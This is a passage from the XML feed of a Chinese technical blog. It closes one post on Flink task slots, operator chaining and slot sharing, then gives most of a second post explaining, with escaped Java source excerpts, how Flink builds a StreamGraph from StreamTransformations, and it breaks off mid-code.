&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;本文主要介绍了Flink中计算资源的相关概念以及原理实现。最核心的是 Task Slot，每个slot能运行一个或多个task。为了拓扑更高效地运行，Flink提出了Chaining，尽可能地将operators chain在一起作为一个task来处理。为了资源更充分的利用，Flink又提出了SlotSharingGroup，尽可能地让多个task共享一个slot。&lt;/p&gt;
&lt;h2 id=&quot;参考资料&quot;&gt;&lt;a href=&quot;#参考资料&quot; class=&quot;headerlink&quot; title=&quot;参考资料&quot;&gt;&lt;/a&gt;参考资料&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ci.apache.org/projects/flink/flink-docs-master/internals/job_scheduling.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Flink: Jobs and Scheduling&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://ci.apache.org/projects/flink/flink-docs-master/concepts/concepts.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Flink Concepts&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本文所讨论的计算资源是指用来执行 Task 的资源，是一个逻辑概念。本文会介绍 Flink 计算资源相关的一些核心概念，如：Slot、SlotSharingGroup、CoLocationGroup、Chain等。并会着重讨论 Flink 如何对计算资源进行管理和隔离，如何将计算资源利用率最大化等等。理解 Flink 中的计算资源对于理解 Job 如何在集群中运行的有很大的帮助，也有利于我们更透彻地理解 Flink 原理，更快速地定位问题。&lt;/p&gt;
&lt;h2 id=&quot;Operator-Chains&quot;&gt;&lt;a href=&quot;#Operator-Chains&quot; class=&quot;headerlink&quot; title=&quot;Operator Chains&quot;&gt;&lt;/a&gt;Operator Chains&lt;/h2&gt;&lt;p&gt;为了更高效地分布式执行，Flink会尽可能地将operator的subtask链接（chain）在一起形成task。每个task在一个线程中执行。将operators链接成task是非常有效的优化：它能减少线程之间的切换，减少消息的序列化/反序列化，减少数据在缓冲区的交换，减少了延迟的同时提高整体的吞吐量。&lt;/p&gt;
    
    </summary>
    
      <category term="Flink" scheme="http://wuchong.me/categories/Flink/"/>
    
    
      <category term="Flink原理与实现" scheme="http://wuchong.me/tags/Flink%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    
      <category term="Flink" scheme="http://wuchong.me/tags/Flink/"/>
    
  </entry>
  
  <entry>
    <title>Flink 原理与实现：如何生成 StreamGraph</title>
    <link href="http://wuchong.me/blog/2016/05/04/flink-internal-how-to-build-streamgraph/"/>
    <id>http://wuchong.me/blog/2016/05/04/flink-internal-how-to-build-streamgraph/</id>
    <published>2016-05-04T15:56:27.000Z</published>
    <updated>2016-05-05T04:52:05.000Z</updated>
    
    <content type="html">&lt;p&gt;继上文&lt;a href=&quot;http://wuchong.me/blog/2016/05/03/flink-internals-overview/&quot;&gt;Flink 原理与实现：架构和拓扑概览&lt;/a&gt;中介绍了Flink的四层执行图模型，本文将主要介绍 Flink 是如何根据用户用Stream API编写的程序，构造出一个代表拓扑结构的StreamGraph的。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;注：本文比较偏源码分析，所有代码都是基于 flink-1.0.x 版本，建议在阅读本文前先对Stream API有个了解，详见&lt;a href=&quot;https://ci.apache.org/projects/flink/flink-docs-master/apis/streaming/index.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;官方文档&lt;/a&gt;。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;StreamGraph 相关的代码主要在 &lt;code&gt;org.apache.flink.streaming.api.graph&lt;/code&gt; 包中。构造StreamGraph的入口函数是 &lt;code&gt;StreamGraphGenerator.generate(env, transformations)&lt;/code&gt;。该函数会由触发程序执行的方法&lt;code&gt;StreamExecutionEnvironment.execute()&lt;/code&gt;调用到。也就是说 StreamGraph 是在 Client 端构造的，这也意味着我们可以在本地通过调试观察 StreamGraph 的构造过程。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;Transformation&quot;&gt;&lt;a href=&quot;#Transformation&quot; class=&quot;headerlink&quot; title=&quot;Transformation&quot;&gt;&lt;/a&gt;Transformation&lt;/h2&gt;&lt;p&gt;&lt;code&gt;StreamGraphGenerator.generate&lt;/code&gt; 的一个关键的参数是 &lt;code&gt;List&amp;lt;StreamTransformation&amp;lt;?&amp;gt;&amp;gt;&lt;/code&gt;。&lt;code&gt;StreamTransformation&lt;/code&gt;代表了从一个或多个&lt;code&gt;DataStream&lt;/code&gt;生成新&lt;code&gt;DataStream&lt;/code&gt;的操作。&lt;code&gt;DataStream&lt;/code&gt;的底层其实就是一个 &lt;code&gt;StreamTransformation&lt;/code&gt;，描述了这个&lt;code&gt;DataStream&lt;/code&gt;是怎么来的。&lt;/p&gt;
&lt;p&gt;StreamTransformation的类图如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1yQmNJFXXXXXnXpXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;DataStream 上常见的 transformation 有 map、flatmap、filter等（见&lt;a href=&quot;https://ci.apache.org/projects/flink/flink-docs-master/apis/streaming/index.html#datastream-transformations&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;DataStream Transformation&lt;/a&gt;了解更多）。这些transformation会构造出一棵 StreamTransformation 树，通过这棵树转换成 StreamGraph。比如 &lt;code&gt;DataStream.map&lt;/code&gt;源码如下，其中&lt;code&gt;SingleOutputStreamOperator&lt;/code&gt;为DataStream的子类：&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &amp;lt;R&amp;gt; &lt;span class=&quot;function&quot;&gt;SingleOutputStreamOperator&amp;lt;R&amp;gt; &lt;span class=&quot;title&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(MapFunction&amp;lt;T, R&amp;gt; mapper)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 通过java reflection抽出mapper的返回值类型&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  TypeInformation&amp;lt;R&amp;gt; outType = TypeExtractor.getMapReturnTypes(clean(mapper), getType(),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      Utils.getCallLocationName(), &lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 返回一个新的DataStream，SteramMap 为 StreamOperator 的实现类&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; transform(&lt;span class=&quot;string&quot;&gt;&quot;Map&quot;&lt;/span&gt;, outType, &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; StreamMap&amp;lt;&amp;gt;(clean(mapper)));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &amp;lt;R&amp;gt; &lt;span class=&quot;function&quot;&gt;SingleOutputStreamOperator&amp;lt;R&amp;gt; &lt;span class=&quot;title&quot;&gt;transform&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(String operatorName, TypeInformation&amp;lt;R&amp;gt; outTypeInfo, OneInputStreamOperator&amp;lt;T, R&amp;gt; operator)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// read the output type of the input Transform to coax out errors about MissingTypeInfo&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  transformation.getOutputType();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 新的transformation会连接上当前DataStream中的transformation，从而构建成一棵树&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  OneInputTransformation&amp;lt;T, R&amp;gt; resultTransform = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; OneInputTransformation&amp;lt;&amp;gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.transformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      operatorName,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      operator,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      outTypeInfo,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      environment.getParallelism());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;meta&quot;&gt;@SuppressWarnings&lt;/span&gt;(&amp;#123; &lt;span class=&quot;string&quot;&gt;&quot;unchecked&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;rawtypes&quot;&lt;/span&gt; &amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  SingleOutputStreamOperator&amp;lt;R&amp;gt; returnStream = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; SingleOutputStreamOperator(environment, resultTransform);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 所有的transformation都会存到 env 中，调用execute时遍历该list生成StreamGraph&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  getExecutionEnvironment().addOperator(resultTransform);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; returnStream;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;从上方代码可以了解到，map转换将用户自定义的函数&lt;code&gt;MapFunction&lt;/code&gt;包装到&lt;code&gt;StreamMap&lt;/code&gt;这个Operator中，再将&lt;code&gt;StreamMap&lt;/code&gt;包装到&lt;code&gt;OneInputTransformation&lt;/code&gt;，最后该transformation存到env中，当调用&lt;code&gt;env.execute&lt;/code&gt;时，遍历其中的transformation集合构造出StreamGraph。其分层实现如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB12u5yJFXXXXXhaXXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;另外，并不是每一个 StreamTransformation 都会转换成 runtime 层中物理操作。有一些只是逻辑概念，比如 union、split/select、partition等。如下图所示的转换树，在运行时会优化成下方的操作图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1XgmOJFXXXXaYXpXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;union、split/select、partition中的信息会被写入到 Source –&amp;gt; Map 的边中。通过源码也可以发现，&lt;code&gt;UnionTransformation&lt;/code&gt;,&lt;code&gt;SplitTransformation&lt;/code&gt;,&lt;code&gt;SelectTransformation&lt;/code&gt;,&lt;code&gt;PartitionTransformation&lt;/code&gt;由于不包含具体的操作所以都没有StreamOperator成员变量，而其他StreamTransformation的子类基本上都有。&lt;/p&gt;
&lt;h2 id=&quot;StreamOperator&quot;&gt;&lt;a href=&quot;#StreamOperator&quot; class=&quot;headerlink&quot; title=&quot;StreamOperator&quot;&gt;&lt;/a&gt;StreamOperator&lt;/h2&gt;&lt;p&gt;DataStream 上的每一个 Transformation 都对应了一个 StreamOperator，StreamOperator是运行时的具体实现，会决定UDF(User-Defined Funtion)的调用方式。下图所示为 StreamOperator 的类图（点击查看大图）：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1l9aYJFXXXXbAXXXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;可以发现，所有实现类都继承了&lt;code&gt;AbstractStreamOperator&lt;/code&gt;。另外除了 project 操作，其他所有可以执行UDF代码的实现类都继承自&lt;code&gt;AbstractUdfStreamOperator&lt;/code&gt;，该类是封装了UDF的StreamOperator。UDF就是实现了&lt;code&gt;Function&lt;/code&gt;接口的类，如&lt;code&gt;MapFunction&lt;/code&gt;,&lt;code&gt;FilterFunction&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&quot;生成-StreamGraph-的源码分析&quot;&gt;&lt;a href=&quot;#生成-StreamGraph-的源码分析&quot; class=&quot;headerlink&quot; title=&quot;生成 StreamGraph 的源码分析&quot;&gt;&lt;/a&gt;生成 StreamGraph 的源码分析&lt;/h2&gt;&lt;p&gt;我们通过在DataStream上做了一系列的转换（map、filter等）得到了StreamTransformation集合，然后通过&lt;code&gt;StreamGraphGenerator.generate&lt;/code&gt;获得StreamGraph，该方法的源码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 构造 StreamGraph 入口函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; StreamGraph &lt;span class=&quot;title&quot;&gt;generate&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(StreamExecutionEnvironment env, List&amp;lt;StreamTransformation&amp;lt;?&amp;gt;&amp;gt; transformations)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; StreamGraphGenerator(env).generateInternal(transformations);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 自底向上（sink-&amp;gt;source）对转换树的每个transformation进行转换。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; StreamGraph &lt;span class=&quot;title&quot;&gt;generateInternal&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(List&amp;lt;StreamTransformation&amp;lt;?&amp;gt;&amp;gt; transformations)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (StreamTransformation&amp;lt;?&amp;gt; transformation: transformations) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    transform(transformation);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; streamGraph;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 对具体的一个transformation进行转换，转换成 StreamGraph 中的 StreamNode 和 StreamEdge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 返回值为该transform的id集合，通常大小为1个（除FeedbackTransformation）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; Collection&amp;lt;Integer&amp;gt; &lt;span class=&quot;title&quot;&gt;transform&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(StreamTransformation&amp;lt;?&amp;gt; transform)&lt;/span&gt; &lt;/span&gt;&amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 跳过已经转换过的transformation&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (alreadyTransformed.containsKey(transform)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; alreadyTransformed.get(transform);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  LOG.debug(&lt;span class=&quot;string&quot;&gt;&quot;Transforming &quot;&lt;/span&gt; + transform);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 为了触发 MissingTypeInfo 的异常&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  transform.getOutputType();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  Collection&amp;lt;Integer&amp;gt; transformedIds;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (transform &lt;span class=&quot;keyword&quot;&gt;instanceof&lt;/span&gt; OneInputTransformation&amp;lt;?, ?&amp;gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    transformedIds = transformOnInputTransform((OneInputTransformation&amp;lt;?, ?&amp;gt;) transform);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (transform &lt;span class=&quot;keyword&quot;&gt;instanceof&lt;/span&gt; TwoInputTransformation&amp;lt;?, ?, ?&amp;gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    transformedIds = transformTwoInputTransform((TwoInputTransformation&amp;lt;?, ?, ?&amp;gt;) transform);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (transform &lt;span class=&quot;keyword&quot;&gt;instanceof&lt;/span&gt; SourceTransformation&amp;lt;?&amp;gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    transformedIds = transformSource((SourceTransformation&amp;lt;?&amp;gt;) transform);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (transform &lt;span class=&quot;keyword&quot;&gt;instanceof&lt;/span&gt; SinkTransformation&amp;lt;?&amp;gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    transformedIds = transformSink((SinkTransformation&amp;lt;?&amp;gt;) transform);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (transform &lt;span class=&quot;keyword&quot;&gt;instanceof&lt;/span&gt; UnionTransformation&amp;lt;?&amp;gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    transformedIds = transformUnion((UnionTransformation&amp;lt;?&amp;gt;) transform);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (transform &lt;span class=&quot;keyword&quot;&gt;instanceof&lt;/span&gt; SplitTransformation&amp;lt;?&amp;gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    transformedIds = transformSplit((SplitTransformation&amp;lt;?&amp;gt;) transform);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (transform &lt;span class=&quot;keyword&quot;&gt;instanceof&lt;/span&gt; SelectTransformation&amp;lt;?&amp;gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    transformedIds = transformSelect((SelectTransformation&amp;lt;?&amp;gt;) transform);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (transform &lt;span class=&quot;keyword&quot;&gt;instanceof&lt;/span&gt; FeedbackTransformation&amp;lt;?&amp;gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    transformedIds = transformFeedback((FeedbackTransformation&amp;lt;?&amp;gt;) transform);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (transform &lt;span class=&quot;keyword&quot;&gt;instanceof&lt;/span&gt; CoFeedbackTransformation&amp;lt;?&amp;gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    transformedIds = transformCoFeedback((CoFeedbackTransformation&amp;lt;?&amp;gt;) transform);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (transform &lt;span class=&quot;keyword&quot;&gt;instanceof&lt;/span&gt; PartitionTransformation&amp;lt;?&amp;gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    transformedIds = transformPartition((PartitionTransformation&amp;lt;?&amp;gt;) transform);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; IllegalStateException(&lt;span class=&quot;string&quot;&gt;&quot;Unknown transformation: &quot;&lt;/span&gt; + transform);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// need this check because the iterate transformation adds itself before&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// transforming the feedback edges&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!alreadyTransformed.containsKey(transform)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    alreadyTransformed.put(transform, transformedIds);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (transform.getBufferTimeout() &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    streamGraph.setBufferTimeout(transform.getId(), transform.getBufferTimeout());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (transform.getUid() != &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    streamGraph.setTransformationId(transform.getId(), transform.getUid());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; transformedIds;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最终都会调用 &lt;code&gt;transformXXX&lt;/code&gt; 来对具体的StreamTransformation进行转换。我们可以看下&lt;code&gt;transformOnInputTransform(transform)&lt;/code&gt;的实现：&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &amp;lt;IN, OUT&amp;gt; &lt;span class=&quot;function&quot;&gt;Collection&amp;lt;Integer&amp;gt; &lt;span class=&quot;title&quot;&gt;transformOnInputTransform&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(OneInputTransformation&amp;lt;IN, OUT&amp;gt; transform)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 递归对该transform的直接上游transform进行转换，获得直接上游id集合&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  Collection&amp;lt;Integer&amp;gt; inputIds = transform(transform.getInput());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 递归调用可能已经处理过该transform了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (alreadyTransformed.containsKey(transform)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; alreadyTransformed.get(transform);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  String slotSharingGroup = determineSlotSharingGroup(transform.getSlotSharingGroup(), inputIds);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 添加 StreamNode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 